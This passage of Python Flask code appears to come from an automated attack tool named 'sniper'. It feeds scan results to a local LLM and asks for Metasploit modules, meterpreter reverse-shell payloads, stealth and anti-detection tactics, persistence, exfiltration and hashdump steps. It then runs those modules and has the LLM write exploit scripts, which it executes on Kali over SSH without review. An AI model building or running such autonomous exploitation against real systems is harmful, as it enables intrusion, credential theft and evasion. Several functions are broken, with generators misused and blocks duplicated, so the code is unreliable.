                    if 'cve' in vuln.get('template', '').lower() or 'cve' in vuln.get('name', '').lower():
                        findings.append({'type': 'cve', 'desc': vuln.get('name', ''), 'cve': vuln.get('template', '')})
                        yield json.dumps({'type': 'message', 'message': f'Critical CVE detected: {vuln.get("template", "")}', 'messageType': 'danger'}) + '\n'
                    if vuln.get('severity', '').lower() in ['critical', 'high']:
                        findings.append({'type': 'high_severity', 'desc': vuln.get('name', ''), 'severity': vuln.get('severity', '')})
                        yield json.dumps({'type': 'message', 'message': f'High-severity vulnerability: {vuln.get("name", "")}', 'messageType': 'danger'}) + '\n'
                return findings

            # Call enhanced parsing and yield all high-value findings
            nuclei_vulns = vulnerabilities if 'vulnerabilities' in locals() else []
            for _ in extract_high_value_findings(nmap_output, whatweb_results, nuclei_vulns):
                pass

            # --- INTELLIGENT LLM-DRIVEN REPORTING ---
            scan_results = {
                'target': target,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'vulnerabilities': vulnerabilities if isinstance(vulnerabilities, list) else [],
                'nmap_output': nmap_output or '',
                'whatweb_results': whatweb_results if isinstance(whatweb_results, list) else [],
                'nuclei_output': '\n'.join(nuclei_scan_output) if isinstance(nuclei_scan_output, list) else (nuclei_scan_output or ''),
                'spring4shell_result': spring4shell_result or {},
                'exploitation_results': exploit_results if isinstance(exploit_results, list) else [],
                'exploit_results': exploit_results if isinstance(exploit_results, list) else [],
                'system_info': system_info or {},
                'network_topology': network_topology or {},
                'vulnershub_enrichment': enriched
            }
            for msg in llm_human_report(scan_results):
                yield msg
            yield json.dumps({'type': 'message', 'message': 'Scan finished successfully.', 'messageType': 'success'}) + '\n'

            # Normalize all fields for frontend
            scan_results = {
                'target': target,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'vulnerabilities': vulnerabilities if isinstance(vulnerabilities, list) else [],
                'nmap_output': nmap_output or '',
                'whatweb_results': whatweb_results if isinstance(whatweb_results, list) else [],
                'nuclei_output': '\n'.join(nuclei_scan_output) if isinstance(nuclei_scan_output, list) else (nuclei_scan_output or ''),
                'spring4shell_result': spring4shell_result or {},
                'exploitation_results': exploit_results if isinstance(exploit_results, list) else [],
                'exploit_results': exploit_results if isinstance(exploit_results, list) else [],
                'system_info': system_info or {},
                'network_topology': network_topology or {}
            }
            yield json.dumps({
                'type': 'results',
                'data': scan_results
            }) + '\n'

            # Save results for PDF reporting
            try:
                # Generate and save LLM report
                llm_report_content = ''
                for msg in llm_human_report(scan_results):
                    # Only take the actual LLM Markdown output (not system messages)
                    if msg.strip().startswith('{'):
                        continue
                    llm_report_content = msg
                    break
                scan_results['llm_report'] = llm_report_content
                with open('temp_scan_results.json', 'w') as f:
                    json.dump(scan_results, f, indent=2)
            except Exception as e:
                yield json.dumps({'type': 'message', 'message': f'Error saving scan results: {str(e)}', 'messageType': 'error'}) + '\n'

            yield json.dumps({
                'type': 'progress',
                'percent': 100,
                'message': 'Scan completed'
            }) + '\n'
            
            # --- SMART EXPLOIT SELECTION ---
            def smart_exploit_selection(services, versions, vulnerabilities):
                prompt = (
                    "You are an elite penetration tester and Metasploit expert.\n"
                    "Given the following scan context, design a sophisticated exploitation strategy that maximizes success probability.\n\n"
                    "For each potential exploit vector, provide:\n"
                    "1. Service, port, and version details\n"
                    "2. Primary exploit module and payload\n"
                    "3. Alternative modules and payloads (ranked by reliability)\n"
                    "4. Exploitation prerequisites and dependencies\n"
                    "5. Expected outcomes and success criteria\n"
                    "6. Post-exploitation steps\n"
                    "7. Risk level and potential impact\n"
                    "8. Stealth considerations\n"
                    "9. Confidence score (0-100)\n"
                    "10. Known CVEs and exploit reliability metrics\n\n"
                    "Consider:\n"
                    "- Multiple payload types (staged vs non-staged)\n"
                    "- Encoder options for evasion\n"
                    "- Custom payload modifications\n"
                    "- Exploit reliability and stability\n"
                    "- Anti-detection techniques\n"
                    "- Fallback options\n\n"
                    "Output as a JSON array, e.g.:\n"
                    "[\n"
                    "  {\n"
                    "    \"service\": \"http\",\n"
                    "    \"port\": 80,\n"
                    "    \"version\": \"nginx 1.19.0\",\n"
                    "    \"primary_module\": \"exploit/multi/http/struts2_content_type_ognl\",\n"
                    "    \"primary_payload\": \"java/meterpreter/reverse_tcp\",\n"
                    "    \"alternatives\": [\n"
                    "      {\"module\": \"exploit/multi/http/struts2_namespace_ognl\", \"payload\": \"java/meterpreter/reverse_https\"},\n"
                    "      {\"module\": \"exploit/multi/http/struts2_rest_xstream\", \"payload\": \"java/meterpreter/reverse_tcp\"}\n"
                    "    ],\n"
                    "    \"prerequisites\": {\"port\": 80, \"service\": \"http\"},\n"
                    "    \"expected_outcome\": \"Reverse shell as www-data\",\n"
                    "    \"post_exploit\": [\"getuid\", \"sysinfo\", \"hashdump\"],\n"
                    "    \"risk_level\": \"medium\",\n"
                    "    \"stealth\": \"Use staged payloads and sleep between attempts\",\n"
                    "    \"confidence\": 85,\n"
                    "    \"cves\": [\"CVE-2020-17530\", \"CVE-2020-17531\"],\n"
                    "    \"reliability\": \"High (90% success rate in lab testing)\"\n"
                    "  }\n"
                    "]\n\n"
                    f"Services: {services}\n"
                    f"Versions: {versions}\n"
                    f"Vulnerabilities: {vulnerabilities}"
                )
                try:
                    content = ask_local_model(prompt)
                    yield json.dumps({'type': 'message', 'message': f'LLM Exploit Strategy:\n{content}', 'messageType': 'system'}) + '\n'
                    try:
                        exploits = json.loads(content)
                        return exploits
                    except Exception:
                        return []
                except Exception as e:
                    yield json.dumps({'type': 'message', 'message': f'LLM exploit selection error: {str(e)}', 'messageType': 'error'}) + '\n'
                    return []

            # --- ADAPTIVE POST-EXPLOITATION ---
            def adaptive_post_exploitation(session_info):
                prompt = (
                    "You are a post-exploitation specialist and red team operator.\n"
                    "Given this session context, design a comprehensive post-exploitation strategy that maximizes information gathering, privilege escalation, and persistence.\n\n"
                    "For each command or technique, provide:\n"
                    "1. Command or technique name\n"
                    "2. Purpose and expected outcome\n"
                    "3. Prerequisites and dependencies\n"
                    "4. Success criteria\n"
                    "5. Risk level and potential impact\n"
                    "6. Stealth considerations\n"
                    "7. Confidence score (0-100)\n"
                    "8. Fallback options\n\n"
                    "Consider:\n"
                    "- Privilege escalation vectors\n"
                    "- Lateral movement opportunities\n"
                    "- Persistence mechanisms\n"
                    "- Data exfiltration methods\n"
                    "- Anti-detection techniques\n"
                    "- System hardening bypasses\n\n"
                    "Output as a JSON array, e.g.:\n"
                    "[\n"
                    "  {\n"
                    "    \"command\": \"whoami /all\",\n"
                    "    \"purpose\": \"Enumerate user privileges and groups\",\n"
                    "    \"expected_outcome\": \"List of user privileges and group memberships\",\n"
                    "    \"prerequisites\": {\"os\": \"windows\"},\n"
                    "    \"success_criteria\": \"Output shows current user context\",\n"
                    "    \"risk_level\": \"low\",\n"
                    "    \"stealth\": \"Use built-in Windows commands\",\n"
                    "    \"confidence\": 100,\n"
                    "    \"fallback\": [\"whoami\", \"net user %username% /domain\"]\n"
                    "  }\n"
                    "]\n\n"
                    f"Session Info: {session_info}"
                )
                try:
                    content = ask_local_model(prompt)
                    yield json.dumps({'type': 'message', 'message': f'LLM Post-Exploitation Strategy:\n{content}', 'messageType': 'system'}) + '\n'
                    try:
                        commands = json.loads(content)
                        return commands
                    except Exception:
                        return []
                except Exception as e:
                    yield json.dumps({'type': 'message', 'message': f'LLM post-exploitation error: {str(e)}', 'messageType': 'error'}) + '\n'
                    return []

            # --- LLM-DRIVEN EXPLOIT MAPPING FOR ALL FINDINGS ---
            def llm_exploit_mapping(findings, target):
                prompt = (
                    "You are an expert penetration tester.\n"
                    "Given the following vulnerability findings (with version, evidence, and asset), for each, recommend:\n"
                    "- The best Metasploit module or manual exploit technique (if any)\n"
                    "- The required parameters (target, port, version, etc.)\n"
                    "- The expected outcome (shell, DoS, info leak, etc.)\n"
                    "- If exploitation is not possible, explain why\n"
                    "Output as a JSON array, e.g.:\n"
                    "[\n  {\n    \"finding\": \"PHP 5.6.40\",\n    \"module\": \"exploit/multi/http/php_cgi_arg_injection\",\n    \"payload\": \"php/meterpreter/reverse_tcp\",\n    \"parameters\": {\"RHOSTS\": \"...\", \"RPORT\": 80},\n    \"expected_outcome\": \"Reverse shell\",\n    \"reason\": \"PHP 5.6.40 is vulnerable to CGI argument injection (CVE-2012-1823).\"\n  }, ...\n]\n"
                    f"Findings: {findings}\nTarget: {target}"
                )
                try:
                    content = ask_local_model(prompt)
                    yield json.dumps({'type': 'message', 'message': f'LLM Exploit Mapping Prompt: {prompt}', 'messageType': 'system'}) + '\n'
                    yield json.dumps({'type': 'message', 'message': f'LLM Exploit Mapping Response: {content}', 'messageType': 'system'}) + '\n'
                    try:
                        exploits = json.loads(content)
                        return exploits
                    except Exception:
                        return []
                except Exception as e:
                    yield json.dumps({'type': 'message', 'message': f'LLM exploit mapping error: {str(e)}', 'messageType': 'error'}) + '\n'
                    return []

            # After Nmap, WhatWeb, Nuclei, collect all context for LLM exploit selection
            detected_versions = []  # You can enhance this by parsing Nmap/WhatWeb output for versions
            nuclei_vulns = vulnerabilities if 'vulnerabilities' in locals() else []
            # Call smart exploit selection
            exploits = []
            for msg in smart_exploit_selection(services, detected_versions, nuclei_vulns):
                yield msg
            if exploits:
                for exp in exploits:
                    yield json.dumps({'type': 'message', 'message': f'LLM recommends exploit: {exp}', 'messageType': 'system'}) + '\n'
                    msf_result = run_msf_exploit(ssh, exp['module'], nmap_target, exp['port'], exp['payload'], LHOST, LPORT)
                    # Adaptive post-exploitation if session opened
                    if msf_result['session_id']:
                        session_info = msf_result['post_exploitation']
                        for msg in adaptive_post_exploitation(session_info):
                            yield msg

            # --- AGGRESSIVE DIRECTORY/FILE FUZZING ---
            fuzz_results, findings = [], []
            for msg in run_dir_fuzzers(ssh, target):
                yield msg
                if isinstance(msg, str) and msg.startswith('{'):
                    try:
                        data = json.loads(msg)
                        if data.get('type') == 'results':
                            fuzz_results = data.get('data', [])
                            findings = data.get('findings', [])
                    except:
                        pass

            # --- TRY ALL RELEVANT METASPLOIT MODULES ---
            def get_all_relevant_msf_modules(service, version):
                # Ask LLM for all possible modules for this service/version
                prompt = (
                    f"List all relevant Metasploit modules for service: {service}, version: {version}. "
                    "Output as a JSON array of module names."
                )
                try:
                    content = ask_local_model(prompt)
                    modules = json.loads(content)
                    return modules
                except Exception as e:
                    return []

            # --- CUSTOM LLM-GENERATED EXPLOIT SCRIPTS ---
            def llm_custom_exploit_script(finding, target):
                prompt = (
                    f"Write a working Python or Bash exploit script for the following vulnerability, ready to run on Kali Linux. Output only the code.\n"
                    f"Finding: {finding}\nTarget: {target}"
                )
                try:
                    content = ask_local_model(prompt)
                    return content
                except Exception as e:
                    return None

            # --- LLM CHAINED/MULTI-STAGE ATTACKS ---
            def llm_chained_attacks(findings, failed_exploits, target):
                prompt = (
                    "You are an elite red team operator and penetration tester. Given these findings and failed exploits, "
                    "design a sophisticated multi-stage attack chain that maximizes the chances of successful exploitation.\n\n"
                    "For each stage in the chain, provide:\n"
                    "1. Stage name and objective\n"
                    "2. Required tools/modules/scripts\n"
                    "3. Prerequisites and dependencies\n"
                    "4. Expected outcomes and success criteria\n"
                    "5. Fallback options if this stage fails\n"
                    "6. Post-exploitation steps if successful\n"
                    "7. Risk level and potential impact\n"
                    "8. Stealth considerations\n\n"
                    "Consider:\n"
                    "- Chaining multiple vulnerabilities\n"
                    "- Privilege escalation paths\n"
                    "- Lateral movement opportunities\n"
                    "- Persistence mechanisms\n"
                    "- Data exfiltration methods\n"
                    "- Anti-detection techniques\n\n"
                    "Output as a JSON array of attack stages, e.g.:\n"
                    "[\n"
                    "  {\n"
                    "    \"stage\": \"Initial Access\",\n"
                    "    \"objective\": \"Gain initial foothold\",\n"
                    "    \"tools\": [\"exploit/multi/http/struts2_content_type_ognl\"],\n"
                    "    \"prerequisites\": {\"port\": 8080, \"service\": \"tomcat\"},\n"
                    "    \"expected_outcome\": \"Reverse shell as tomcat user\",\n"
                    "    \"fallback\": [\"exploit/multi/http/tomcat_mgr_upload\"],\n"
                    "    \"post_exploit\": [\"getuid\", \"sysinfo\"],\n"
                    "    \"risk_level\": \"medium\",\n"
                    "    \"stealth\": \"Use staged payloads and sleep between attempts\"\n"
                    "  }\n"
                    "]\n\n"
                    f"Findings: {findings}\n"
                    f"Failed Exploits: {failed_exploits}\n"
                    f"Target: {target}"
                )
                try:
                    content = ask_local_model(prompt)
                    yield json.dumps({'type': 'message', 'message': f'LLM Chained Attack Analysis:\n{content}', 'messageType': 'system'}) + '\n'
                    try:
                        stages = json.loads(content)
                        return stages
                    except Exception:
                        return []
                except Exception as e:
                    yield json.dumps({'type': 'message', 'message': f'LLM chained attack error: {str(e)}', 'messageType': 'error'}) + '\n'
                    return []

            # --- RUN FUZZERS ---
            fuzz_results, findings = [], []
            for msg in run_dir_fuzzers(ssh, target):
                yield msg
                if isinstance(msg, str) and msg.startswith('{'):
                    try:
                        data = json.loads(msg)
                        if data.get('type') == 'results':
                            fuzz_results = data.get('data', [])
                            findings = data.get('findings', [])
                    except:
                        pass

            # --- TRY ALL RELEVANT METASPLOIT MODULES FOR EACH FINDING ---
            failed_exploits = []
            for finding in findings:
                service = finding.get('vulnerability', '')
                version = finding.get('description', '')
                modules = get_all_relevant_msf_modules(service, version)
                for module in modules:
                    yield json.dumps({'type': 'message', 'message': f'Trying Metasploit module: {module} for {service}', 'messageType': 'system'}) + '\n'
                    # Use a generic payload for demonstration
                    payload = 'php/meterpreter/reverse_tcp' if 'php' in module else 'linux/x86/meterpreter/reverse_tcp'
                    try:
                        msf_result = run_msf_exploit(ssh, module, target, 80, payload, LHOST, LPORT)
                        if msf_result['session_id']:
                            yield json.dumps({'type': 'message', 'message': f'Successful exploitation with {module}!', 'messageType': 'system'}) + '\n'
                            session_info = msf_result['post_exploitation']
                            for msg in adaptive_post_exploitation(session_info):
                                yield msg
                            break
                        else:
                            failed_exploits.append({'module': module, 'service': service})
                    except Exception as e:
                        failed_exploits.append({'module': module, 'service': service, 'error': str(e)})
                        yield json.dumps({'type': 'message', 'message': f'Exploit failed: {module} ({str(e)})', 'messageType': 'error'}) + '\n'
                else:
                    # --- CUSTOM LLM-GENERATED EXPLOIT SCRIPT IF ALL MODULES FAIL ---
                    code = llm_custom_exploit_script(finding, target)
                    if code:
                        yield json.dumps({'type': 'message', 'message': f'LLM-generated exploit script for {service}:\n{code[:1000]}', 'messageType': 'system'}) + '\n'
                        # Save and execute the script on Kali
                        ext = 'py' if 'python' in code else 'sh'
                        remote_path = f'/tmp/llm_exploit_{service}.{ext}'
                        ssh.upload_file_content(code, remote_path)
                        exec_cmd = f'python3 {remote_path}' if ext == 'py' else f'bash {remote_path}'
                        try:
                            output = ssh.execute_command(exec_cmd, timeout=120)
                            yield json.dumps({'type': 'message', 'message': f'LLM exploit script output:\n{output[:2000]}', 'messageType': 'system'}) + '\n'
                        except Exception as e:
                            yield json.dumps({'type': 'message', 'message': f'LLM exploit script failed: {str(e)}', 'messageType': 'error'}) + '\n'

            # --- LLM CHAINED/MULTI-STAGE ATTACKS ---
            chained = llm_chained_attacks(findings, failed_exploits, target)
            for step in chained:
                yield json.dumps({'type': 'message', 'message': f'LLM chained attack suggestion: {step}', 'messageType': 'system'}) + '\n'

            # --- ADVANCED SERVICE & EXPLOIT LOGIC ---
            # Parse Nmap output for versions and known vulnerabilities
            findings = []
            version_map = {}
            for match in re.finditer(r'(\d+)/tcp\s+open\s+(\w+)(?:\s+([\w\.-]+))?', nmap_output):
                port = int(match.group(1))
                service = match.group(2)
                version = match.group(3) if match.lastindex >= 3 else ''
                version_map[(port, service)] = version
                findings.append({'port': port, 'service': service, 'version': version})
                yield json.dumps({'type': 'message', 'message': f'Testing {service} on port {port} (version: {version})...', 'messageType': 'system'}) + '\n'
                # Heuristic: known vulnerable versions
                if service == 'ftp' and 'vsftpd 2.3.4' in version:
                    yield json.dumps({'type': 'message', 'message': f'High-value finding: vsftpd 2.3.4 backdoor detected on port {port}', 'messageType': 'warning'}) + '\n'
                if service == 'ssh' and 'OpenSSH 4.7p1' in version:
                    yield json.dumps({'type': 'message', 'message': f'Potentially vulnerable OpenSSH version 4.7p1 on port {port}', 'messageType': 'warning'}) + '\n'
                if service == 'smb' or service == 'netbios' or port in [139, 445]:
                    yield json.dumps({'type': 'message', 'message': f'Enumerating SMB/NetBIOS on port {port}', 'messageType': 'system'}) + '\n'
                if service == 'http' and 'Apache' in version:
                    yield json.dumps({'type': 'message', 'message': f'Apache HTTP detected on port {port} (version: {version})', 'messageType': 'system'}) + '\n'
                if service == 'mysql' and version:
                    yield json.dumps({'type': 'message', 'message': f'MySQL detected on port {port} (version: {version})', 'messageType': 'system'}) + '\n'
                # Add more heuristics as needed

            # --- EXPLOIT ATTEMPTS ---
            exploit_results = []
            for finding in findings:
                port = finding['port']
                service = finding['service']
                version = finding['version']
                yield json.dumps({'type': 'message', 'message': f'Attempting exploit mapping for {service} on port {port} (version: {version})...', 'messageType': 'system'}) + '\n'
                exp = suggest_exploit(service, port, version)
                if exp:
                    yield json.dumps({'type': 'message', 'message': f'Attempting exploitation using {exp["module"]} on {service}:{port}', 'messageType': 'system'}) + '\n'
                    msf_result = run_msf_exploit(ssh, exp['module'], nmap_target, port, exp['payload'], LHOST, LPORT)
                    exploit_results.append({
                        'service': service,
                        'port': port,
                        'module': exp['module'],
                        'payload': exp['payload'],
                        'output': msf_result['output'],
                        'session_id': msf_result['session_id'],
                        'post_exploitation': msf_result['post_exploitation']
                    })
                    if msf_result['session_id']:
                        yield json.dumps({'type': 'message', 'message': f'Exploit succeeded! Session {msf_result["session_id"]} opened on {service}:{port}', 'messageType': 'success'}) + '\n'
                    else:
                        yield json.dumps({'type': 'message', 'message': f'Exploit failed for {service}:{port}', 'messageType': 'warning'}) + '\n'
                else:
                    yield json.dumps({'type': 'message', 'message': f'No known exploit for {service}:{port} (version: {version})', 'messageType': 'info'}) + '\n'

            # After all steps, correlate findings
            correlated = {}
            for finding in findings:
                key = (finding['port'], finding['service'])
                if key not in correlated:
                    correlated[key] = []
                correlated[key].append(finding)
            for (port, service), group in correlated.items():
                if len(group) > 1:
                    yield json.dumps({'type': 'message', 'message': f'Correlated finding: {service} on port {port} flagged by multiple tools.', 'messageType': 'info'}) + '\n'

            # Post-exploitation intelligence
            for result in exploit_results:
                if result.get('session_id'):
                    post = result.get('post_exploitation', {})
                    if post.get('user'):
                        yield json.dumps({'type': 'message', 'message': f'Post-exploitation: User info: {post["user"]}', 'messageType': 'info'}) + '\n'
                    if post.get('hashes'):
                        yield json.dumps({'type': 'message', 'message': f'Post-exploitation: Hashes dumped: {post["hashes"][:100]}...', 'messageType': 'warning'}) + '\n'
                    if post.get('filesystem') and 'root' in post.get('filesystem'):
                        yield json.dumps({'type': 'message', 'message': 'Post-exploitation: Root filesystem access detected!', 'messageType': 'danger'}) + '\n'

            # Error handling: already yields errors at each step, but add timeline entry
            # (You can add more detailed fallback logic as needed)

            # Result enrichment: for each CVE/service/version, add description/risk/remediation
            def enrich_finding(finding):
                desc = ''
                risk = 'info'
                remediation = ''
                if finding.get('type') == 'cve':
                    desc = f"CVE {finding.get('cve')}: {finding.get('desc','')}"
                    risk = 'critical'
                    remediation = 'Patch or mitigate as per CVE advisory.'
                elif finding.get('type') == 'default_creds':
                    desc = 'Default or weak credentials detected.'
                    risk = 'high'
                    remediation = 'Change default credentials.'
                elif finding.get('type') == 'backdoor':
                    desc = 'Backdoor detected.'
                    risk = 'critical'
                    remediation = 'Remove backdoor and investigate compromise.'
                elif finding.get('type') == 'outdated':
                    desc = f'Outdated {finding.get("service")} version: {finding.get("version")}'
                    risk = 'medium'
                    remediation = 'Update to the latest version.'
                return {**finding, 'description': desc, 'risk': risk, 'remediation': remediation}
            enriched_findings = [enrich_finding(f) for f in findings]
            for ef in enriched_findings:
                yield json.dumps({'type': 'message', 'message': f'Enriched finding: {ef["description"]} (Risk: {ef["risk"]}) Remediation: {ef["remediation"]}', 'messageType': 'info'}) + '\n'

            # At the end, yield a summary of the attack chain/timeline
            yield json.dumps({'type': 'message', 'message': '--- Attack Chain / Timeline ---', 'messageType': 'system'}) + '\n'
            timeline = []
            def log_timeline(step, status, details=None):
                entry = {
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'step': step,
                    'status': status,
                    'details': details or ''
                }
                timeline.append(entry)
                yield json.dumps({'type': 'message', 'message': f"[{entry['timestamp']}] {step}: {status} {details or ''}", 'messageType': 'system'}) + '\n'

            # Example: log start
            for msg in log_timeline('Scan', 'Started', f'Target: {target}'):
                yield msg

            # ... (insert timeline logging at each major/minor step, e.g. after each scan, exploit, post-exploitation, error, etc.)

        except Exception as e:
            yield json.dumps({
                'type': 'message',
                'message': f'Scan failed: {str(e)}',
                'messageType': 'error'
            }) + '\n'
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@bp.route('/api/sniper/report', methods=['GET'])
def generate_report():
    try:
        # Generate PDF report using the report generator utility
        pdf_data = generate_pdf_report()
        return Response(
            pdf_data,
            mimetype='application/pdf',
            headers={
                'Content-Disposition': 'attachment; filename=sniper-report.pdf'
            }
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/sniper')
def sniper_page():
    # Only redirect if NOT an AJAX/fetch request
    if not request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return redirect(url_for('pages_bp.new_scan'))  # Adjust endpoint if needed
    return render_template('sniper.html') 